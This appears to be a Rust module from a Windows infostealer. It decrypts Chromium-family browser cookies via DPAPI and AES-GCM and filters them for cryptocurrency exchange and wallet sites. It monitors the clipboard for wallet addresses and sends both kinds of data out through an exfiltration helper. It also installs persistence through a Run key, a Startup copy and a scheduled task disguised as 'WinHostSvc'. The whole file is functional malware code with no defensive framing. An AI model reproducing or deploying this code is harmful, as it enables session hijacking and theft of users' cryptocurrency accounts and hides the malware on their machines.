//! Windows-specific: DPAPI + AES-GCM browser cookie decrypt, clipboard,
//! persistence.

use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
use base64::{engine::general_purpose::STANDARD, Engine};
use serde::Serialize;
use std::fs;
use std::path::Path;

#[derive(Serialize)]
struct CookieHit { br: String, host: String, name: String, v: String }

const EXCHANGE_HOSTS: &[&str] = &[
    "binance.com", "coinbase.com", "kraken.com", "kucoin.com",
    "crypto.com", "okx.com", "bybit.com", "bitfinex.com",
    "gemini.com", "bitstamp.net", "gate.io", "huobi.com",
    "metamask.io", "phantom.app", "wallet.coinbase.com",
];

const CHROME_VARIANTS: &[(&str, &str)] = &[
    ("Chrome",  "Google\\Chrome\\User Data"),
    ("Edge",    "Microsoft\\Edge\\User Data"),
    ("Brave",   "BraveSoftware\\Brave-Browser\\User Data"),
    ("Opera",   "Opera Software\\Opera Stable"),
    ("OperaGX", "Opera Software\\Opera GX Stable"),
    ("Vivaldi", "Vivaldi\\User Data"),
    ("Chromium","Chromium\\User Data"),
    ("Yandex",  "Yandex\\YandexBrowser\\User Data"),
];

pub fn harvest_session_tokens() {
    let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
    let mut out: Vec<CookieHit> = Vec::new();
    for (name, rel) in CHROME_VARIANTS {
        let base = Path::new(&local).join(rel);
        if !base.exists() { continue; }
        let mk = match chrome_master_key(&base) { Some(k) => k, None => continue };
        let rd = match fs::read_dir(&base) { Ok(r) => r, Err(_) => continue };
        for prof in rd.flatten() {
            let pname = prof.file_name().to_string_lossy().to_string();
            if pname != "Default" && !pname.starts_with("Profile ") { continue; }
            let mut ck = prof.path().join("Network").join("Cookies");
            if !ck.exists() { ck = prof.path().join("Cookies"); }
            if !ck.exists() { continue; }
            let tmp = std::env::temp_dir().join(format!("ck_{}.db", fast_id()));
            if fs::copy(&ck, &tmp).is_err() { continue; }
            if let Ok(conn) = rusqlite::Connection::open_with_flags(&tmp, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
                if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
                    if let Ok(rows) = stmt.query_map([], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?, r.get::<_, Vec<u8>>(2)?))) {
                        for row in rows.flatten() {
                            let (host, cn, enc) = row;
                            if !EXCHANGE_HOSTS.iter().any(|h| host.contains(h)) { continue; }
                            if let Some(v) = decrypt_chrome_blob(&enc, &mk) {
                                out.push(CookieHit { br: format!("{}:{}", name, pname), host, name: cn, v });
                            }
                        }
                    }
                }
            }
            let _ = fs::remove_file(&tmp);
        }
    }
    if !out.is_empty() {
        svc_common::exfil::exfil_event("session_tokens", &out);
    }
}

fn chrome_master_key(user_data_root: &Path) -> Option<[u8; 32]> {
    let ls = user_data_root.join("Local State");
    let raw = fs::read_to_string(ls).ok()?;
    let j: serde_json::Value = serde_json::from_str(&raw).ok()?;
    let b64 = j.get("os_crypt")?.get("encrypted_key")?.as_str()?;
    let mut blob = STANDARD.decode(b64).ok()?;
    if blob.len() <= 5 { return None; }
    blob.drain(0..5);
    let dec = dpapi_unprotect(&blob)?;
    if dec.len() != 32 { return None; }
    let mut k = [0u8; 32];
    k.copy_from_slice(&dec);
    Some(k)
}

fn dpapi_unprotect(blob: &[u8]) -> Option<Vec<u8>> {
    use windows_sys::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
    use windows_sys::Win32::Foundation::LocalFree;

    unsafe {
        let mut input: CRYPT_INTEGER_BLOB = std::mem::zeroed();
        input.cbData = blob.len() as u32;
        input.pbData = blob.as_ptr() as *mut u8;

        let mut output: CRYPT_INTEGER_BLOB = std::mem::zeroed();
        let ok = CryptUnprotectData(
            &mut input,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut output,
        );
        if ok == 0 || output.pbData.is_null() { return None; }
        let out = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
        LocalFree(output.pbData as _);
        Some(out)
    }
}

fn decrypt_chrome_blob(blob: &[u8], master_key: &[u8; 32]) -> Option<String> {
    if blob.is_empty() { return None; }
    if blob.starts_with(b"v10") || blob.starts_with(b"v11") {
        if blob.len() < 3 + 12 + 16 { return None; }
        let nonce = &blob[3..15];
        let ct = &blob[15..];
        let cipher = Aes256Gcm::new(master_key.into());
        cipher.decrypt(Nonce::from_slice(nonce), ct).ok()
            .and_then(|p| String::from_utf8(p).ok())
    } else {
        dpapi_unprotect(blob).and_then(|p| String::from_utf8(p).ok())
    }
}

pub fn clipboard_monitor() {
    std::thread::spawn(|| loop {
        if let Some(addr) = read_clipboard_address() {
            svc_common::exfil::exfil_event("clip_addr", serde_json::json!({"addr": addr}));
        }
        std::thread::sleep(std::time::Duration::from_secs(2));
    });
}

fn read_clipboard_address() -> Option<String> {
    use windows_sys::Win32::System::DataExchange::{CloseClipboard, GetClipboardData, IsClipboardFormatAvailable, OpenClipboard};
    use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
    unsafe {
        if IsClipboardFormatAvailable(13) == 0 { return None; }
        if OpenClipboard(std::ptr::null_mut()) == 0 { return None; }
        let h = GetClipboardData(13);
        if h.is_null() { let _ = CloseClipboard(); return None; }
        let ptr = GlobalLock(h);
        if ptr.is_null() { let _ = CloseClipboard(); return None; }
        let mut len = 0usize;
        let wide = ptr as *const u16;
        while *wide.add(len) != 0 && len < 4096 { len += 1; }
        let slice = std::slice::from_raw_parts(wide, len);
        let s = String::from_utf16_lossy(slice);
        let _ = GlobalUnlock(h);
        let _ = CloseClipboard();
        if crate::wallets::is_wallet_addr(&s) { Some(s) } else { None }
    }
}

pub fn install_persistence(entries: &[String]) {
    use winreg::enums::*;
    use winreg::RegKey;
    let self_path = std::env::current_exe().unwrap_or_default();
    for entry in entries {
        match entry.as_str() {
            "runkey" => {
                if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(
                    r"Software\Microsoft\Windows\CurrentVersion\Run", KEY_SET_VALUE) {
                    let _ = hkcu.set_value("WinHostSvc", &self_path.to_string_lossy().to_string());
                }
            }
            "startup" => {
                if let Ok(appdata) = std::env::var("APPDATA") {
                    let startup = std::path::PathBuf::from(appdata)
                        .join("Microsoft/Windows/Start Menu/Programs/Startup");
                    let _ = std::fs::create_dir_all(&startup);
                    let _ = std::fs::copy(&self_path, startup.join("WinHostSvc.exe"));
                }
            }
            "schtask" => {
                let _ = std::process::Command::new("schtasks")
                    .args(["/Create", "/F", "/SC", "ONLOGON", "/TN", "WinHostSvc",
                           "/TR", self_path.to_string_lossy().as_ref()])
                    .output();
            }
            _ => {}
        }
    }
}

fn fast_id() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_nanos() as u64).unwrap_or(0)
}
